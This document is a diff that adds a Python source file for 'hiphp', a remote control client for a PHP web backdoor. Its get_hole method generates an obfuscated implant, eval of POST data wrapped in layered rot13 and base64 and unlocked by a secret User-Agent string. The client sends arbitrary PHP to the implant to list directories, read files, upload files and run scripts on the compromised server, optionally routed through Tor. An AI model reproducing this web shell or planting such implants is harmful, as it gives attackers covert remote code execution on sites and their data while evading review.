@@ -1,0 +1,248 @@
+#!/usr/bin/env python
+# coding:utf-8
+#   |                                                          |
+# --+----------------------------------------------------------+--
+#   |   Code by : yasserbdj96                                  |
+#   |   Email   : yasser.bdj96@gmail.com                       |
+#   |   Github  : https://github.com/yasserbdj96               |
+#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
+# --+----------------------------------------------------------+--  
+#   |        all posts #yasserbdj96 ,all views my own.         |
+# --+----------------------------------------------------------+--
+#   |                                                          |
+
+#START{
+from hiphp.hiphpcoding import rot13,tobase64,tomd5
+from hiphp.hiphpphpfunctions import *
+from hiphp.hiphphelp import help
+from hiphp.hiphpmsgs import *
+from ashar import *
+from hexor import *
+from asciitext import *
+import requests
+import re
+import ast
+#import readline
+from os.path import exists
+
+#start hiphp class:
+class hiphp:
+    #__init__:
+    def __init__(self,key,url,retu=False):
+        #
+        self.key=tomd5(key)
+        self.url=url
+        self.retu=retu
+        #
+        url_w=re.compile(r"https?://(www\.)?")
+        self.url_w=url_w.sub('',url).strip().strip('/')
+        #
+        self.headers={'User-Agent':self.key}
+        #colors:
+        self.color=hexor(True,"hex")
+        self.color2=hexor(False,"hex")
+        #
+        self.c_red="#ea4335"#red
+        self.c_white_red="#f3938b"#white-red
+        self.c_blue="#4285f4"#blue
+        self.c_yellow="#fbbc05"#yellow
+        self.c_green="#34a853"#green
+        #
+        self.set=""
+        self.do_x=0
+
+    #cli:
+    def cli(self):
+        #
+        logo=""
+        if self.do_x==0:
+            spas=" "*5
+            logo+=self.color.c(f"""
+{spas}             ▄███████▄    ▄█    █▄       ▄███████▄ 
+{spas}            ███    ███   ███    ███     ███    ███ 
+{spas}╦   ╦       ███    ███   ███    ███     ███    ███ 
+{spas}║   ║ ═╦═ ▀█████████▀  ▀▀███▀▀▀▀███▀  ▀█████████▀  
+{spas}╠═══╣  ║    ███          ███    ███     ███        
+{spas}║   ║  ║    ███          ███    ███     ███        
+{spas}╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀  V0.2.19\n""",self.c_red)
+            logo+=self.color.c(" "*37+"Code by -> ",self.c_yellow)+self.color.c("yasserbdj96\n",self.c_green)
+            logo+=self.color.c("\n - You are now connected safety. You can print the PHP commands below for comprehensive control of the site.\n",self.c_blue)
+            logo+=self.color.c(" - If you are having difficulties controlling the program, you can type '--help' for more informations.\n",self.c_yellow)
+            logo+=self.color.c(" - '--exit' OR 'Ctrl+C' for exit :)\n\n",self.c_yellow)
+            self.do_x+=1
+        #
+        reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
+        if emsg_1 in reee:
+            return reee
+        else:
+            getcwd=self.color.c(reee,self.c_green)
+        #
+        xxr1=self.color.c('┌──(',self.c_blue)
+        xxr2=self.color.c(')──[',self.c_blue)
+        xxr3=self.color.c(']',self.c_blue)
+        xxr4=self.color.c('└─|>',self.c_blue)
+        #
+        key_w_color=self.color.c(self.key,self.c_red)
+        url_w_color=self.color.c(self.url_w,self.c_yellow)
+        at=self.color.c("|",self.c_white_red)
+        print(logo+xxr1+key_w_color+at+url_w_color+xxr2+getcwd+xxr3)
+
+        #try:
+        command=input(xxr4)
+        #except:
+        #    exit()
+        if command and command!="":
+            #help
+            if command[0:6]=="--help":
+                print(help())
+            #exit
+            elif command[0:6]=="--exit":
+                exit()
+            #ls
+            elif command[0:4]=="--ls":
+                if len(command)==4:
+                    command=scandir()
+                elif command[5:9]=="-all":
+                    dirx=command[10:]
+                    if dirx=="":dirx="./"
+                    command=scandir_all(dirx)
+                else:
+                    dirx=command[5:]
+                    command=scandir(dirx)
+                sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
+                x=ast.literal_eval(sd)
+                for i in range(len(x)):
+                    if x[i]!="." and x[i]!="..":
+                        print(x[i].replace("\/","/"))
+            #set
+            elif command[0:5]=="--set":
+                self.set+=command[6:]
+            #delete set
+            elif command[0:6]=="--dset":
+                self.set=""
+            #Get the hole Code
+            elif command[0:6]=="--geth":
+                hiphp.get_hole(self)
+            #cat
+            elif command[0:5]=="--cat":
+                dirx=command[6:]
+                command=file_get_contents(dirx)
+                hiphp.do(self,self.key,self.url,self.headers,False,command)
+            #rf
+            elif command[0:4]=="--rf":
+                varss=command.split(" ")
+                
+                if varss[len(varss)-1]=="":
+                    del varss[len(varss)-1]
+                hiphp.run_file(self,varss[1],varss[2:])
+            #up
+            elif command[0:4]=="--up":
+                try:
+                    file_path,to=command[5:len(command)].split(" ")
+                    if to[len(to)-1:len(to)]!="/":
+                        to=to+"/"
+                    hiphp.upload(self,file_path,to)
+                except ZeroDivisionError:
+                    hiphp.upload(self,command[5:len(command)])
+            else:
+                hiphp.do(self,self.key,self.url,self.headers,False,command)
+        else:
+            self.color2.c(emsg_2,self.c_red)
+        hiphp.cli(self)
+
+    #do:
+    def do(self,key,url,header,retu,command):
+        regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
+        proxies = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
+        if regex.match(url):
+            #.onion
+            response=requests.post(url,headers=header,proxies=proxies)
+        else:
+            response=requests.post(url,headers=header)
+        #response=requests.post(url,headers=header)
+        #
+        if response.status_code==200:
+            key_len=len(key)+1
+            # if the key are true:
+            if response.text[0:key_len]=="#"+key:
+                ploads={'command':self.set+command}
+                if ".onion" in url:
+                    response=requests.post(url,headers=header,data=ploads,proxies=proxies)
+                else:
+                    response=requests.post(url,headers=header,data=ploads)
+                response_text=response.text[key_len:]
+                if retu==True:
+                    return response_text
+                else:
+                    if len(response_text)!=0:
+                        print(response_text)
+            else:
+                if retu==True:
+                    return emsg_1
+                else:
+                    hexor().c(emsg_1,self.c_red)
+                    exit()
+        else:
+            hexor().c(emsg_3+" '"+url+"'.",self.c_red)
+            exit()
+
+    #run_file:
+    def run_file(self,file_path,*opts):        
+        if exists(file_path):
+            open_file=open(file_path).read()
+            if open_file[0:5]=="<?php":
+                open_file=open_file[6:]
+            if open_file[len(open_file)-2:len(open_file)]=="?>":
+                open_file=open_file[:len(open_file)-2]
+            
+            if len(opts)>0:
+                if type(opts[0])==list:
+                    opts=opts[0]
+                
+                for i in range(len(opts)):
+                    value,string=opts[i].split("==")
+                    open_file=open_file.replace(f"__{value}__",string)
+            
+            result=hiphp.do(self,self.key,self.url,self.headers,True,open_file)
+            if self.retu==False:
+                print(result)
+            return result
+        else:
+            self.color2.c(emsg_4,self.c_red)
+
+    #run:
+    def run(self,command):
+        if self.retu==True:
+            return hiphp.do(self,self.key,self.url,self.headers,True,command)
+        else:
+            hiphp.do(self,self.key,self.url,self.headers,False,command)
+
+    #upload:
+    def upload(self,path_to_upluad,to=""):
+        try:
+            with open(path_to_upluad,"rb") as base64_file:
+                encoded_string=tobase64(base64_file.read().decode("utf-8"))
+            p=""
+            if to!="":
+                if to[0:2]!="./":
+                    p="./"
+                hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
+            hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
+        except ZeroDivisionError:
+            self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)
+
+    #get the hole:
+    def get_hole(self):
+        code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
+        code=rot13(tobase64(rot13(tobase64(rot13(code)))))
+        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
+        php_s="/*php code start*/"
+        php_e="/*php code end*/"
+        if self.retu==True:
+            return php_s+"\n"+code+"\n"+php_e
+        else:
+            self.color2.c(msg_1,self.c_yellow)
+            self.color2.c(php_s,self.c_red)
+            self.color2.c(code,self.c_green)
+            self.color2.c(php_e,self.c_red)
+#}END.
